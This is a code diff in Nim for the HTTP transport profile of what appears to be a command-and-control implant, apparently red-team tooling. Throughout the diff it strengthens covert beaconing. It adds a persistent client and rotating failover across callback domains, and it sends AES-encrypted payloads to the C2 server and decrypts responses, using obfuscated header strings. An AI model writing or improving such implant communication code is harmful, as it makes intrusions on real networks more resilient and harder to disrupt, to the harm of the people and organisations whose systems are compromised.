@@ -1,7 +1,7 @@
-import std/[base64, strutils, json, random, os, httpclient, tables, strformat, uri]
+import std/[base64, strutils, json, random, os, tables, strformat, uri]
 import ../config
 import ../utils/crypto
-import ../utils/httpx_client
+import ../utils/httpx_client  # Also exports HttpClientWrapper from http_client
 import ../utils/debug
 import ../utils/strenc
 
@@ -20,6 +20,7 @@ type
     domainRotation: string
     failoverThreshold: int
     currentDomainIndex: int
+    httpClient: HttpClientWrapper  # Persistent HTTP client to prevent resource exhaustion
 
 proc newHttpxProfile*(): HttpxProfile =
   ## Create a new HTTPX profile with raw_c2_config support
@@ -59,6 +60,9 @@ proc newHttpxProfile*(): HttpxProfile =
       result.rawC2Config = newJNull()
   else:
     result.rawC2Config = newJNull()
+  
+  # Create persistent HTTP client (reused across all requests)
+  result.httpClient = newClientWrapper()
   
   debug "[DEBUG] HTTPX Profile initialized"
   debug "[DEBUG] Callback domains: ", result.callbackDomains.join(", ")
@@ -124,27 +128,44 @@ proc send*(profile: var HttpxProfile, data: string, callbackUuid: string = ""): 
       let baseUrl = profile.selectDomain()
       let fullUrl = baseUrl & uri
       try:
-        rawResponse = httpxPost(fullUrl, payload, postConfig)
+        rawResponse = httpxPost(fullUrl, payload, postConfig, profile.httpClient)
       except:
         debug "[DEBUG] Request failed: ", getCurrentExceptionMsg()
         return ""
     else: # fail-over
       var attempts = 0
-      for domain in profile.callbackDomains:
+      var checkedDomains = 0
+      # Start from currentDomainIndex and wrap around
+      while checkedDomains < profile.callbackDomains.len:
+        let domainIdx = (profile.currentDomainIndex + checkedDomains) mod profile.callbackDomains.len
+        let domain = profile.callbackDomains[domainIdx]
         let fullUrl = domain & uri
         var domainAttempts = 0
+        var domainSucceeded = false
         while domainAttempts < profile.failoverThreshold:
           try:
-            rawResponse = httpxPost(fullUrl, payload, postConfig)
+            rawResponse = httpxPost(fullUrl, payload, postConfig, profile.httpClient)
+            domainSucceeded = true
             break
           except:
             debug "[DEBUG] Attempt ", domainAttempts + 1, " failed for ", domain
             domainAttempts += 1
-        if rawResponse.len > 0:
+        if domainSucceeded and rawResponse.len > 0:
+          # Success - reset to this working domain for next time
+          profile.currentDomainIndex = domainIdx
           break
+        elif domainSucceeded:
+          # Got response but it was empty - still move to next domain
+          debug "[DEBUG] Domain ", domain, " returned empty response"
+        else:
+          # All attempts failed for this domain - move to next
+          debug "[DEBUG] Domain ", domain, " exhausted all ", profile.failoverThreshold, " attempts"
+        checkedDomains += 1
         attempts += 1
       if rawResponse.len == 0:
         debug "[DEBUG] All domains failed after failover attempts"
+        # Move to next domain for next attempt
+        profile.currentDomainIndex = (profile.currentDomainIndex + 1) mod profile.callbackDomains.len
         return ""
     # Check if response is empty (e.g., from HTTP error like 502)
     if rawResponse.len == 0:
@@ -169,9 +190,9 @@ proc send*(profile: var HttpxProfile, data: string, callbackUuid: string = ""): 
     let baseUrl = profile.selectDomain()
     let fullUrl = baseUrl & "/" & profile.config.postUri
     try:
-      let client = newHttpClient()
-      client.headers = newHttpHeaders({obf("User-Agent"): profile.config.userAgent})
-      result = client.postContent(fullUrl, payload)
+      # Use persistent client for fallback too
+      profile.httpClient.headers[obf("User-Agent")] = profile.config.userAgent
+      result = profile.httpClient.postContent(fullUrl, payload)
       # Decrypt or decode response
       if profile.aesKey.len > 0 and callbackUuid.len > 0:
         result = decryptPayload(result, profile.aesKey)
@@ -184,10 +205,6 @@ proc send*(profile: var HttpxProfile, data: string, callbackUuid: string = ""): 
     except:
       debug "[DEBUG] Fallback request failed: ", getCurrentExceptionMsg()
       return ""
-
-proc close*(profile: var HttpxProfile) =
-  ## Cleanup (no persistent connection for HTTP)
-  discard
 
 proc setAesKey*(profile: var HttpxProfile, key: seq[byte]) =
   ## Set the AES encryption key
